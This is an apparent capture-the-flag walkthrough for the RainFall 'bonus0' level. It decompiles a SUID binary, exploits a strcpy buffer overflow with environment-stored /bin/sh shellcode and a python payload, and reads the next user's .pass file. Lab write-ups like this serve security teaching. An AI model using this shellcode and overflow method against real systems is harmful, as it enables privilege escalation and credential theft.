@@ -1,0 +1,164 @@
+When we change to bonus0 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
+```
+
+We find another SUID executable, this time owned by bonus1.
+
+```shell
+bonus0@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
+```
+
+When executing, it waits for input twice and then prints it.
+
+```shell
+bonus0@RainFall:~$ ./bonus0
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -
+BBBBB
+AAAAAAAAAAAAAAAAAAAABBBBB BBBBB
+```
+
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 bonus0@192.168.184.128:/home/user/bonus0/bonus0 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+bonus0@192.168.184.128's password:
+bonus0                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this:
+
+```C
+void p(char *dest, char *s)
+{
+    undefined *puVar1;
+    char *src;
+    size_t nbyte;
+    char *var_100ch;
+
+    puts(s);
+    read(0, &var_100ch, 0x1000);
+    puVar1 = (undefined *)strchr(&var_100ch, 10);
+    *puVar1 = 0;
+    strncpy(dest, &var_100ch, 0x14);
+    return;
+}
+
+void pp(char *dest)
+{
+    char cVar1;
+    uint32_t uVar2;
+    char *pcVar3;
+    uint8_t uVar4;
+    char *src;
+    int32_t var_40h;
+    int32_t var_34h;
+    int32_t var_20h;
+
+    uVar4 = 0;
+    p((char *)&var_34h, (char *)data.080486a0);
+    p((char *)&var_20h, (char *)data.080486a0);
+    strcpy(dest, &var_34h);
+    uVar2 = 0xffffffff;
+    pcVar3 = dest;
+    do {
+        if (uVar2 == 0) break;
+        uVar2 = uVar2 - 1;
+        cVar1 = *pcVar3;
+        pcVar3 = pcVar3 + (uint32_t)uVar4 * -2 + 1;
+    } while (cVar1 != '\0');
+    *(undefined2 *)(dest + (~uVar2 - 1)) = 0x20;
+    strcat(dest, &var_20h);
+    return;
+}
+
+undefined4 main(void)
+{
+    char acStack_3a [12];
+    char *s;
+
+    pp(acStack_3a);
+    puts(acStack_3a);
+    return 0;
+}
+```
+
+There are three functions: ``main()``, ``p()`` and ``pp()``. The latter uses ``strcpy()`` which is vulnerable to buffer overflows. The buffer of the first input is 4096, but only the first 20 bytes are being copied over. The second buffer, which we can overflow, only takes 20 bytes. As the buffer is rather small, we can't provide our shellcode in there. Instead we can use the environment. 
+
+```shell
+bonus0@RainFall:~$ export A=$(python -c "print '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+bonus0@RainFall:~$ env
+A=1��Ph//shh/bin��PS��
+[...]
+```
+
+After exporting our shellcode, we can use a program to figure out its location in memory.
+
+```C
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+  int j;
+  printf("Argument vector:\n");
+  for (j = 0; ; j++) {
+    if (argv[j] == NULL) break;
+    printf("%2d: %p %s\n", j, argv[j], argv[j]);
+  }
+  printf("Environment vector:\n");
+  for (j++; ; j++) {
+    if (argv[j] == NULL) break;
+    printf("%2d: %p %s\n", j, argv[j], argv[j]);
+  }
+  return 0;
+}
+```
+
+We can compile and run it in ``/tmp``.
+
+```shell
+bonus0@RainFall:/tmp$ gcc env_addr.c
+bonus0@RainFall:/tmp$ ./a.out
+Argument vector:
+ 0: 0xbffff8c9 ./a.out
+Environment vector:
+ 2: 0xbffff8d1 A=1��Ph//shh/bin��PS��
+[...]
+```
+
+With this we have our exploit and only need to figure out how to call it. Therefore we need to find the offset of the ``EIP``. By utilising a pattern generator with **GDB** this becomes easier. [[1]](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
+
+Now that we know the offset is 9, we can build our payload
+
+``python -c "print 'A'*4095 + '\n' + 'Aa0Aa1Aa2\x24\xfe\xff\xbfa4Aa5Aa'" > /tmp/file``
+
+and run it:
+
+```shell
+bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'Aa0Aa1Aa2\xd3\xf8\xff\xbfa4Aa5Aa'" > /tmp/file
+bonus0@RainFall:~$ cat /tmp/file - | ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2����a4Aa5Aa�� Aa0Aa1Aa2����a4Aa5Aa��
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
